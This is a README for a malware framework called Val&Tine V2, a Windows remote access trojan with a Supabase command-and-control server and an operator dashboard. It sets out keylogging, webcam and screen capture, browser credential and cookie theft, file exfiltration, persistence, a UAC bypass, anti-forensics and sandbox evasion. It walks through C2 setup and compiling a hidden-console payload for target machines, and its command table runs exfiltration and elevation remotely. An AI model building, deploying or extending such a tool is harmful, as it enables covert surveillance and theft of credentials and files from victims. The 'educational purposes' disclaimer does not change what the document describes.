# 💘 Val&Tine V2 - Machine Management System

A sophisticated, cross-platform remote machine management framework utilizing a custom Supabase backend for command and control (C2). Val&Tine V2 provides a modern web-based dashboard for fleet management, real-time surveillance, and rapid data exfiltration.

![Version](https://img.shields.io/badge/version-2.0.0-red)
![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?logo=go)
![Supabase](https://img.shields.io/badge/Supabase-Backend-3ECF8E?logo=supabase)

---

## 📖 Table of Contents

- [Features](#-features)
- [Architecture](#-architecture)
- [Prerequisites](#-prerequisites)
- [Installation & Setup](#-installation--setup)
  - [1. Clone the Repository](#1-clone-the-repository)
  - [2. Supabase Backend Setup](#2-supabase-backend-setup)
  - [3. Frontend Dashboard Setup](#3-frontend-dashboard-setup)
  - [4. Payload Compilation](#4-payload-compilation)
- [Usage Guide](#-usage-guide)
- [Disclaimer](#-disclaimer)

---

## ✨ Features

### Core Capabilities
- **Custom C2 Infrastructure**: Migrated from Discord API to a dedicated Supabase backend for total control, reliability, and data privacy.
- **Real-Time Dashboard**: Modern React-based UI built with Lovable.dev, featuring live updates via Supabase Realtime subscriptions.
- **Multi-Client Management**: Monitor and control hundreds of machines simultaneously with batch command execution.
- **Encrypted Communications**: AES-256 encrypted command streams (optional implementation in payload).

### Surveillance Suite
- 🖥️ **Remote Shell**: Execute commands via native Windows API `CreateProcess` with Anonymous Pipes for I/O redirection (stealthier than `exec.Command`).
- 📷 **Screen Capture**: Native GDI `BitBlt` implementation compiled directly into the binary—no external FFmpeg dependency required for screenshots.
- 🎥 **Webcam & Microphone**: Optional FFmpeg integration for media capture.
- ⌨️ **Keylogger**: Low-level `GetAsyncKeyState` hooking with active window context tracking.
- 📋 **Clipboard Monitoring**: Periodic clipboard content extraction.

### Exfiltration Tools
- 📁 **File Manager**: Browse, upload, and download files with chunked transfer support (bypasses file size limits).
- 🌐 **Browser Data**: Extract history, cookies, and saved credentials (Chrome, Edge, Firefox).
- 🔑 **Credential Harvesting**: WiFi passwords, system info, and user data.

### System Control
- 🔒 **Persistence**: Registry Run keys + Startup folder VBS stager.
- 🛡️ **UAC Bypass**: `ShellExecute` "runas" elevation technique with social engineering dialog.
- 🧹 **Anti-Forensics**: Clear temp files, PowerShell history, RunMRU, and Recycle Bin.
- 🕵️ **Anti-Analysis**: VM detection (MAC address, registry, BIOS), debugger checks, and analysis tool detection (Process Hacker, Wireshark, etc.).

---

## 🏗 Architecture

```
┌─────────────────┐         ┌──────────────────┐         ┌─────────────────┐
│   Target Machine│ ◄─────► │   Supabase DB    │ ◄─────► │  Operator Dashboard │
│   (Go Payload)  │   HTTPS │   (PostgreSQL)   │   HTTPS │   (React/Vite)      │
└─────────────────┘         └──────────────────┘         └─────────────────┘
        │                            │                            │
        │ 1. Beacon / Register       │                            │
        │ 2. Fetch Commands          │                            │
        │ 3. Execute & Upload Result │                            │
        │ 4. Upload Files/Screens    │                            │
        └────────────────────────────┘                            │
                                     ◄────────────────────────────┘
                                              1. View Fleet Status
                                              2. Issue Commands
                                              3. View Screenshots/Logs
```

---

## 📋 Prerequisites

1.  **Go (Golang)**: Version 1.21 or higher. [Download Here](https://go.dev/dl/)
2.  **Node.js & npm**: Version 18 or higher. [Download Here](https://nodejs.org/)
3.  **Supabase Account**: Free tier works. [Sign Up Here](https://supabase.com/)
4.  **GitHub Account**: For deployment of the frontend.

---

## 🚀 Installation & Setup

### 1. Clone the Repository

```bash
git clone https://github.com/YOUR_USERNAME/Val-Tine-V2.git
cd Val-Tine-V2
```

### 2. Supabase Backend Setup

The Supabase CLI handles everything — migrations, storage buckets, RLS policies, and edge functions — in a few commands. No need to manually run SQL.

1.  **Create a Supabase Project**:
    *   Log in to [Supabase](https://supabase.com/).
    *   Click **"New Project"**.
    *   Name it (e.g., `val-tine-c2`). Set a strong database password. Remember this password — the CLI will ask for it.
    *   Select a region close to you and wait for it to provision.

2.  **Run the CLI setup** (requires Node.js installed from prerequisites):
    ```bash
    # Authenticate with your Supabase account
    npx supabase login

    # Link this repo to your project (find your ref under Settings > General in the dashboard)
    npx supabase link --project-ref <your-project-ref>

    # Push all database migrations (tables, indexes, RLS policies, storage buckets, realtime)
    npx supabase db push

    # Deploy the file-upload edge function
    npx supabase functions deploy file-upload --no-verify-jwt
    ```
    That's it — your entire backend is now set up.

3.  **Get Your Credentials**:
    *   In the Supabase dashboard, go to **Settings > API**.
    *   Copy the **Project URL** — this is your `VITE_SUPABASE_URL`.
    *   Copy the **anon public key** — this is your `VITE_SUPABASE_PUBLISHABLE_KEY`.

### 3. Frontend Dashboard Setup

The dashboard is a static web app that connects to your Supabase backend.

1.  **Configure Environment Variables**:
    *   Edit the `.env` file in the project root with the credentials from the previous step:
        ```env
        VITE_SUPABASE_URL=https://your-project-ref.supabase.co
        VITE_SUPABASE_PUBLISHABLE_KEY=your-anon-key-here
        ```

2.  **Install & Run**:
    ```bash
    npm install
    npm run dev
    ```
    Open `http://localhost:5173` in your browser.

3.  **Deploy (Optional)**:
    *   Push your code to GitHub.
    *   Connect the repo to Vercel, Netlify, or Lovable for automatic deployment.
    *   Set `VITE_SUPABASE_URL` and `VITE_SUPABASE_PUBLISHABLE_KEY` in your hosting provider's environment variables.

### 4. Payload Compilation

The payload is the executable you deploy to target machines. It connects to your Supabase backend.

1.  **Install Go**:
    *   Download and install Go from [go.dev](https://go.dev/dl/).

2.  **Prepare Project Structure**:
    *   Ensure `main.go` and `go.mod` are in the same directory.

3.  **Initialize Module & Install Dependencies**:
    Open a terminal/command prompt in the project folder.
    ```bash
    go mod init gopay
    go get golang.org/x/sys/windows
    go mod tidy
    ```

4.  **Input Supabase Credentials**:
    *   Open `main.go` with a text editor.
    *   Scroll to the `main()` function at the bottom.
    *   Find the `config := &Config{...}` block.
    *   Replace the placeholder values with your Supabase URL and Anon Key:
        ```go
        Domains: []C2Domain{
            {
                URL:      "https://your-project-ref.supabase.co", // PASTE HERE
                APIKey:   "your-anon-key-here",                   // PASTE HERE
                Priority: 10,
            },
        },
        ```

5.  **Build the Executable**:
    *   To build a standard executable:
        ```bash
        go build -o payload.exe main.go
        ```
    *   To build a stealthier version (hidden console, smaller size):
        ```bash
        go build -ldflags="-s -w -H windowsgui" -o payload.exe main.go
        ```
        *   `-s -w`: Strips debug information (reduces file size).
        *   `-H windowsgui`: Hides the console window on execution.

---

## 🎮 Usage Guide

### Operating the Dashboard

1.  **Dashboard View**:
    *   When you open the site, you see the **Fleet Overview**.
    *   Machines running the payload will appear here automatically within 30 seconds.
    *   Status Indicators: 🟢 Online, 🟡 Idle, ⚫ Offline.

2.  **Control Panel**:
    *   Click a machine row to open the **Control Panel**.
    *   **System Info**: View hardware, network, and OS details.
    *   **Remote Shell**: Type commands and see output in real-time.
    *   **Surveillance**: View screenshots, webcam feeds, and keylogs.
    *   **File Manager**: Browse the file system and exfiltrate data.

3.  **Batch Commands**:
    *   Use the checkboxes on the left of the table to select multiple machines.
    *   Use the **Batch Action Bar** to send commands to all selected machines at once.

### Command Reference

The payload accepts the following commands (sent via the "Remote Shell" or Batch Command interface):

| Command | Description |
| :--- | :--- |
| `sysinfo` | Gather and upload full system specifications. |
| `screenshot` | Capture a single screenshot of the desktop. |
| `keylog_start` | Start the background keylogger process. |
| `keylog_stop` | Stop the keylogger. |
| `persist` | Install persistence mechanisms (Registry + Startup). |
| `unpersist` | Remove persistence mechanisms. |
| `elevate` | Attempt UAC Bypass to gain Administrator privileges. |
| `cleanup` | Clear temp files, history, and recycle bin. |
| `browserdb` | Exfiltrate browser databases (Chrome, Edge, Firefox). |
| `exfiltrate <path>` | Compress and upload files from a specific directory. |
| `exit` | Terminate the payload on the target machine. |

---

## ⚠️ Disclaimer

**This tool is intended for EDUCATIONAL and RESEARCH purposes only.**

The use of this software to target systems that you do not own or have explicit permission to test is illegal. The developers and contributors assume no liability and are not responsible for any misuse or damage caused by this program. By using this software, you agree to comply with all applicable local, state, and federal laws.

**Unauthorized access to computer systems is a crime.**

